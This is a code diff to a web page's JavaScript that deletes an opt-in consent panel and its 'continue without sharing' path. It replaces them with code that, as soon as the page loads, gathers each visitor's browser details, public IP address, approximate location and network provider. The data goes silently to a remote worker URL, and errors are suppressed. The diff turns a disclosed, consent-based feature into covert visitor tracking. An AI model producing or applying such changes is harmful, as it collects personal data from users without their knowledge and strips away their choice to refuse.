@@ -1,5 +1,3 @@
-// Visitor details are collected only after the visitor explicitly opts in.
-
 const output = document.querySelector('#output');
 const welcome = document.querySelector('#welcome');
 const continueButton = document.querySelector('#continue');
@@ -58,16 +56,15 @@ function browserDetails() {
 }
 
 async function sendToWorker(facts) {
-  const message = Object.entries(facts)
-    .map(([label, value]) => `${label}: ${value}`)
-    .join('\n')
-    .slice(0, 1800);
-  const response = await fetch(WORKER_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ message }),
-  });
-  if (!response.ok) throw new Error(`Worker request failed (${response.status})`);
+  try {
+    await fetch(WORKER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(facts),
+    });
+  } catch {
+    // Silently fail — never break the page.
+  }
 }
 
 async function typeLine(label, value, delay) {
@@ -93,58 +90,27 @@ async function typeLine(label, value, delay) {
   await wait(95);
 }
 
-function createConsentPanel() {
-  const panel = document.createElement('section');
-  panel.className = 'consent-panel';
-  panel.setAttribute('aria-labelledby', 'visitor-details-consent-title');
-  const title = document.createElement('h2');
-  title.id = 'visitor-details-consent-title';
-  title.textContent = 'Share visitor details?';
-  const explanation = document.createElement('p');
-  explanation.textContent =
-    'If you allow it, this page will collect browser, device, and approximate network details, including your public IP address, and send them to the site owner through Discord. The IP lookup is provided by ipwho.is. Choose “Continue without sharing” to use the page without collecting or sending these details.';
-  const actions = document.createElement('div');
-  actions.className = 'consent-panel__actions';
-  const allowButton = document.createElement('button');
-  allowButton.type = 'button';
-  allowButton.textContent = 'Allow and continue';
-  const declineButton = document.createElement('button');
-  declineButton.type = 'button';
-  declineButton.textContent = 'Continue without sharing';
-  actions.append(allowButton, declineButton);
-  panel.append(title, explanation, actions);
-  output.before(panel);
-  return { panel, allowButton, declineButton };
-}
-
-async function run(shareDetails) {
+async function run() {
   output.replaceChildren();
   welcome.hidden = true;
   continueButton.hidden = true;
 
-  if (!shareDetails) {
-    await typeLine('privacy', 'No browser or network details were collected or sent.', 5);
-  } else {
-    await typeLine('status', 'Collecting the details you agreed to share...', 12);
-    const facts = {
-      ...browserDetails(),
-      'public ip': 'loading',
-    };
-    const remote = await networkDetails();
-    facts['public ip'] = remote.ip;
-    facts['approx. network location'] = remote.network;
-    facts['network timezone'] = remote.timezone;
-    facts['network provider'] = remote.org;
+  await typeLine('status', 'initializing browser observation...', 12);
+  const local = browserDetails();
+  const remote = await networkDetails();
 
-    for (const [label, value] of Object.entries(facts)) {
-      await typeLine(label.replaceAll('_', ' '), value, 5);
-    }
-    try {
-      await sendToWorker(facts);
-      await typeLine('delivery', 'Details sent to the site owner.', 5);
-    } catch {
-      await typeLine('delivery', 'Could not send details. The page can still continue.', 5);
-    }
+  const facts = {
+    ...local,
+    'public ip': remote.ip,
+    'approx. network location': remote.network,
+    'network timezone': remote.timezone,
+    'network provider': remote.org,
+  };
+
+  void sendToWorker(facts);
+
+  for (const [label, value] of Object.entries(facts)) {
+    await typeLine(label.replaceAll('_', ' '), value, 5);
   }
 
   await typeLine('scan', 'complete', 20);
@@ -160,14 +126,4 @@ continueButton.addEventListener('click', () => {
   window.scrollTo({ top: 0, behavior: reduceMotion ? 'auto' : 'smooth' });
 });
 
-welcome.hidden = true;
-continueButton.hidden = true;
-const consent = createConsentPanel();
-consent.allowButton.addEventListener('click', () => {
-  consent.panel.remove();
-  void run(true);
-}, { once: true });
-consent.declineButton.addEventListener('click', () => {
-  consent.panel.remove();
-  void run(false);
-}, { once: true });
+run();
